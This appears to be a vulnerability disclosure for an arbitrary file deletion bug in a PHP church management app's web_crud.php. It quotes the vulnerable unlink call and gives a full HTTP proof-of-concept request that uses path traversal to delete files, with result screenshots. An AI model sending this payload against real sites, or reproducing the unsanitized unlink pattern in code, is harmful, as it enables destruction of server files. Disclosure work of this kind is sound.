### Vulnerability file address

In line 80 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_photo1_img']);`,` $_POST['old_photo1_img']` parameters have not been restricted, which causes any file to be deleted

```php
    if (isset($_POST['update'])) {
        function generateUniqueFilename($file)
        {
            $file_extension = pathinfo($file['name'], PATHINFO_EXTENSION);
            $unique_filename = uniqid() . '.' . $file_extension;
            return $unique_filename;
        }

        if ($_FILES['photo1']['tmp_name'] != '') {
            $img = generateUniqueFilename($_FILES['photo1']);
            $filepath = "../../assets/images/" . $img;

            if (move_uploaded_file($_FILES["photo1"]["tmp_name"], $filepath)) {
                @unlink("../../assets/images/" . $_POST['old_photo1_img']);
            }
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 370

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_photo1_img"

../../1.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="photo1";filename="1.txt"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `1.txt` file in the `church/` directory

![image-20250503210548929](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505032105038.png)



Then we execute the above poc to attack

![image-20250504201025986](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042010114.png)



Files are deleted after the attack is successful

![image-20250504201106592](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042011621.png)
